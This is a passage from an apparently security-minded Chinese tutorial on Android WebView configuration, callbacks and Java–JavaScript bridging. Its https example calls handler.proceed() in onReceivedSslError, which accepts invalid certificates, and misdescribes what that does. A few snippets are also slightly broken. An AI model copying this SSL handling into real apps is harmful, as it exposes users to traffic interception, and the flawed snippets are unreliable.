findViewById(R.id.webView1);</span><br></pre></td></tr></table></figure><p>第三步：进行配置-利用WebSettings子类（常见方法）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明WebSettings子类</span></span><br><span class="line"><span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> webView.getSettings();</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果访问的页面中要与Javascript交互，则webview必须设置支持Javascript</span></span><br><span class="line">webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//支持插件</span></span><br><span class="line">webSettings.setPluginsEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//设置自适应屏幕，两者合用</span></span><br><span class="line">webSettings.setUseWideViewPort(<span class="literal">true</span>); <span class="comment">//将图片调整到适合webview的大小</span></span><br><span class="line">webSettings.setLoadWithOverviewMode(<span class="literal">true</span>); <span class="comment">// 缩放至屏幕的大小</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//缩放操作</span></span><br><span class="line">webSettings.setSupportZoom(<span class="literal">true</span>); <span class="comment">//支持缩放，默认为true。是下面那个的前提。</span></span><br><span class="line">webSettings.setBuiltInZoomControls(<span class="literal">true</span>); <span class="comment">//设置内置的缩放控件。若为false，则该WebView不可缩放</span></span><br><span class="line">webSettings.setDisplayZoomControls(<span class="literal">false</span>); <span class="comment">//隐藏原生的缩放控件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//其他细节操作</span></span><br><span class="line">webSettings.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK); <span class="comment">//关闭webview中缓存</span></span><br><span class="line">webSettings.setAllowFileAccess(<span class="literal">true</span>); <span class="comment">//设置可以访问文件</span></span><br><span class="line">webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>); <span class="comment">//支持通过JS打开新窗口</span></span><br><span class="line">webSettings.setLoadsImagesAutomatically(<span class="literal">true</span>); <span class="comment">//支持自动加载图片</span></span><br><span class="line">webSettings.setDefaultTextEncodingName(<span class="string">&quot;utf-8&quot;</span>);<span class="comment">//设置编码格式</span></span><br></pre></td></tr></table></figure><p>常见方法：设置WebView缓存</p><ul><li>当加载 html 页面时，WebView会在&#x2F;data&#x2F;data&#x2F;包名目录下生成 database 与 cache 两个文件夹</li><li>请求的 URL记录保存在 WebViewCache.db，而 URL的内容是保存在 WebViewCache 文件夹下</li><li>是否启用缓存：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//优先使用缓存</span></span><br><span class="line">WebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);</span><br><span class="line"></span><br><span class="line"><span class="comment">//缓存模式如下：</span></span><br><span class="line">    <span class="comment">//LOAD_CACHE_ONLY: 不使用网络，只读取本地缓存数据</span></span><br><span class="line">    <span class="comment">//LOAD_DEFAULT: （默认）根据cache-control决定是否从网络上取数据。</span></span><br><span class="line">    <span class="comment">//LOAD_NO_CACHE: 不使用缓存，只从网络获取数据.</span></span><br><span class="line">    <span class="comment">//LOAD_CACHE_ELSE_NETWORK，只要本地有，无论是否过期，或者no-cache，都使用缓存中的数据</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//不使用缓存</span></span><br><span class="line">WebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-WebViewClient类"><a href="#lt-2-gt-WebViewClient类" class="headerlink" title="&lt;2&gt;WebViewClient类"></a><strong>&lt;2&gt;WebViewClient类</strong></h5><p>用来处理各种通知 &amp; 请求事件</p><p><strong>shouldOverrideUrlLoading()</strong></p><p>作用：打开网页时不调用系统浏览器， 而是在本WebView中显示；在网页上的所有加载都经过这个方法,这个函数我们可以做很多操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Webview控件</span></span><br><span class="line"><span class="type">Webview</span> <span class="variable">webview</span> <span class="operator">=</span> (WebView) findViewById(R.id.webView);</span><br><span class="line"></span><br><span class="line"><span class="comment">//加载一个网页</span></span><br><span class="line">webView.loadUrl(<span class="string">&quot;http://www.google.com/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写shouldOverrideUrlLoading()方法，使得打开网页时不调用系统浏览器， 而是在本WebView中显示</span></span><br><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">           view.loadUrl(url);</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>onPageStarted()</strong></p><p>作用：开始载入页面调用的，我们可以设定一个loading的页面，告诉用户程序在等待网络响应。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">onPageStarted</span><span class="params">(WebView view, String url, Bitmap favicon)</span> &#123;</span><br><span class="line">        <span class="comment">//设定加载开始的操作</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure><p><strong>onLoadResource()</strong></p><p>作用：在加载页面资源时会调用，每一个资源（比如图片）的加载都会调用一次。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onLoadResource</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">         <span class="comment">//设定加载资源的操作</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><strong>onReceivedError（）</strong></p><p>作用：加载页面的服务器出现错误时（如404）调用。</p><p>App里面使用webview控件的时候遇到了诸如404这类的错误的时候，若也显示浏览器里面的那种错误提示页面就显得很丑陋了，那么这个时候我们的app就需要加载一个本地的错误提示页面，即webview如何加载一个本地的页面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//步骤1：写一个html文件（error_handle.html），用于出错时展示给用户看的提示页面</span></span><br><span class="line"><span class="comment">//步骤2：将该html文件放置到代码根目录的assets文件夹下</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤3：复写WebViewClient的onRecievedError方法</span></span><br><span class="line"><span class="comment">//该方法传回了错误码，根据错误类型可以进行不同的错误分类处理</span></span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>()&#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedError</span><span class="params">(WebView view, <span class="type">int</span> errorCode, String description, String failingUrl)</span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(errorCode)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">case</span> HttpStatus.SC_NOT_FOUND:</span><br><span class="line">                    view.loadUrl(<span class="string">&quot;file:///android_assets/error_handle.html&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>onReceivedSslError()</strong></p><p>作用：处理https请求</p><p>webView默认是不处理https请求的，页面显示空白，需要进行如下设置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">webView.setWebViewClient(<span class="keyword">new</span> <span class="title class_">WebViewClient</span>() &#123;    </span><br><span class="line">        <span class="meta">@Override</span>    </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedSslError</span><span class="params">(WebView view, SslErrorHandler handler, SslError error)</span> &#123;    </span><br><span class="line">            handler.proceed();    <span class="comment">//表示等待证书响应</span></span><br><span class="line">        <span class="comment">// handler.cancel();      //表示挂起连接，为默认方式</span></span><br><span class="line">        <span class="comment">// handler.handleMessage(null);    //可做其他处理</span></span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;);    </span><br></pre></td></tr></table></figure><p><strong>c.WebChromeClient</strong></p><p>作用：辅助 WebView 处理 Javascript 的对话框,网站图标,网站标题等等。</p><p> <strong>onProgressChanged（）</strong></p><p>作用：获得网页的加载进度并显示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>()&#123;</span><br><span class="line"></span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onProgressChanged</span><span class="params">(WebView view, <span class="type">int</span> newProgress)</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (newProgress &lt; <span class="number">100</span>) &#123;</span><br><span class="line">              <span class="type">String</span> <span class="variable">progress</span> <span class="operator">=</span> newProgress + <span class="string">&quot;%&quot;</span>;</span><br><span class="line">              progress.setText(progress);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p><strong>onReceivedTitle（）</strong></p><p>作用：获取Web页中的标题</p><p>每个网页的页面都有一个标题，比如<a href="http://www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？">www.baidu.com这个页面的标题即“百度一下，你就知道”，那么如何知道当前webview正在加载的页面的title并进行设置呢？</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceivedTitle</span><span class="params">(WebView view, String title)</span> &#123;</span><br><span class="line">       titleview.setText(title)；</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="（3）WebView与JS的交互"><a href="#（3）WebView与JS的交互" class="headerlink" title="（3）WebView与JS的交互"></a>（3）WebView与JS的交互</h4><p>Android WebView与JS的交互：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/5.png" alt="image-20220726171737615"></p><h5 id="lt-1-gt-Android调用JS"><a href="#lt-1-gt-Android调用JS" class="headerlink" title="&lt;1&gt;Android调用JS"></a>&lt;1&gt;Android调用JS</h5><p><strong><code>WebView.loadUrl()</code></strong></p><p>首先，准备html文件，放到assets中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">callJS</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="title function_">alert</span>(<span class="string">&quot;Android调用了JS的callJS方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Android调用JS方法测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/8.png" alt="image-20220729093637679"></p><p>然后在Java层中添加代码，进行调用JS文件以及JS中的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置与Js交互的权限</span></span><br><span class="line"> webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"> <span class="comment">// 设置允许JS弹窗</span></span><br><span class="line"> webSettings.setJavaScriptCanOpenWindowsAutomatically(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 先载入JS代码</span></span><br><span class="line"> <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line"> mWebView.loadUrl(<span class="string">&quot;file:///android_asset/AndroJs.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line"> button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">         <span class="comment">// 通过Handler发送消息</span></span><br><span class="line">         mWebView.post(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// 注意调用的JS方法名要对应上</span></span><br><span class="line">                 <span class="comment">// 调用javascript的callJS()方法</span></span><br><span class="line">                 mWebView.loadUrl(<span class="string">&quot;javascript:callJS()&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 由于设置了弹窗检验调用结果,所以需要支持js对话框</span></span><br><span class="line"> <span class="comment">// webview只是载体，内容的渲染需要使用webviewChromClient类去实现</span></span><br><span class="line"> <span class="comment">// 通过设置WebChromeClient对象处理JavaScript的对话框</span></span><br><span class="line"> <span class="comment">//设置响应js 的Alert()函数</span></span><br><span class="line"> mWebView.setWebChromeClient(<span class="keyword">new</span> <span class="title class_">WebChromeClient</span>() &#123;</span><br><span class="line">     <span class="meta">@Override</span></span><br><span class="line">     <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onJsAlert</span><span class="params">(WebView view, String url, String message, <span class="keyword">final</span> JsResult result)</span> &#123;</span><br><span class="line">         AlertDialog.<span class="type">Builder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AlertDialog</span>.Builder(MainActivity.<span class="built_in">this</span>);</span><br><span class="line">         b.setTitle(<span class="string">&quot;Alert&quot;</span>);</span><br><span class="line">         b.setMessage(message);</span><br><span class="line">         b.setPositiveButton(android.R.string.ok, <span class="keyword">new</span> <span class="title class_">DialogInterface</span>.OnClickListener() &#123;</span><br><span class="line">             <span class="meta">@Override</span></span><br><span class="line">             <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(DialogInterface dialog, <span class="type">int</span> which)</span> &#123;</span><br><span class="line">                 result.confirm();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;);</span><br><span class="line">         b.setCancelable(<span class="literal">false</span>);</span><br><span class="line">         b.create().show();</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果演示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/9.png" alt="image-20220729093932401"></p><p>我们可以发现程序成功的加载了html文件，然后我们点击按钮去调用js中的方法</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/10.png" alt="image-20220729094015144"></p><p>这里就成功的通过loadUrl进行了调用</p><p><strong>特别注意：JS代码调用一定要在 <code>onPageFinished（）</code> 回调之后才能调用，否则不会调用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onPageFinished()属于WebViewClient类的方法，主要在页面加载结束时调用</span><br></pre></td></tr></table></figure><p><strong>WebView.evaluateJavascript()</strong></p><p>优点：该方法比第一种方法效率更高、使用更简洁</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">因为该方法的执行不会使页面刷新，而第一种方法（loadUrl ）的执行则会。</span><br><span class="line">Android <span class="number">4.4</span> 后才可使用</span><br></pre></td></tr></table></figure><p>具体使用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用evaluateJavascript来加载</span></span><br><span class="line">mWebView.evaluateJavascript(<span class="string">&quot;javascript:callJS()&quot;</span>, <span class="keyword">new</span> <span class="title class_">ValueCallback</span>&lt;String&gt;() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceiveValue</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="comment">//此处为 js 返回的结果</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/11.png" alt="image-20220729094734817"></p><p>同样加载成功</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/12.png" alt="image-20220729094802205"></p><h5 id="lt-2-gt-JS调用Android"><a href="#lt-2-gt-JS调用Android" class="headerlink" title="&lt;2&gt;JS调用Android"></a>&lt;2&gt;JS调用Android</h5><p><strong><code>addJavascriptInterface</code></strong></p><p>首先，准备html文件，放到assets中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JS调用Android</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Carson<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">function</span> <span class="title function_">callAndroid</span>(<span class="params"></span>)&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="comment">//由于对象映射，所以调用test对象等于调用Android映射的对象</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            test.<span class="title function_">hello</span>(<span class="string">&quot;WindXaa js调用了android中的hello方法&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!--点击按钮则调用callAndroid函数--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;callAndroid()&quot;</span>&gt;</span>Click Attack<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/13.png" alt="image-20220729100734122"></p><p>然后加载调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsToAndroActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_js_to_andro);</span><br><span class="line"></span><br><span class="line">        <span class="type">WebView</span> <span class="variable">mWebView</span> <span class="operator">=</span> (WebView) findViewById(R.id.Wind_webview1);</span><br><span class="line">        <span class="type">WebSettings</span> <span class="variable">webSettings</span> <span class="operator">=</span> mWebView.getSettings();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置与Js交互的权限</span></span><br><span class="line">        webSettings.setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过addJavascriptInterface()将Java对象映射到JS对象</span></span><br><span class="line">        <span class="comment">//参数1：Javascript对象名</span></span><br><span class="line">        <span class="comment">//参数2：Java对象名</span></span><br><span class="line">        mWebView.addJavascriptInterface(<span class="keyword">new</span> <span class="title class_">AndroidtoJs</span>(), <span class="string">&quot;test&quot;</span>);<span class="comment">//AndroidtoJS类对象映射到js的test对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载JS代码</span></span><br><span class="line">        <span class="comment">// 格式规定为:file:///android_asset/文件名.html</span></span><br><span class="line">        mWebView.loadUrl(<span class="string">&quot;file:///android_asset/javascript.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 提供接口在Webview中供JS调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AndroidtoJs</span> &#123;</span><br><span class="line">        <span class="comment">// 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解</span></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;WindXaa&quot;</span>,<span class="string">&quot;Hello，&quot;</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们切换到第二个测试用例</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/14.png" alt="image-20220729100854323"></p><p>直接点击</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/15.png" alt="image-20220729100914639"></p><p>此时已经成功的加载了我们的JS，我们点击按钮</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/16.png" 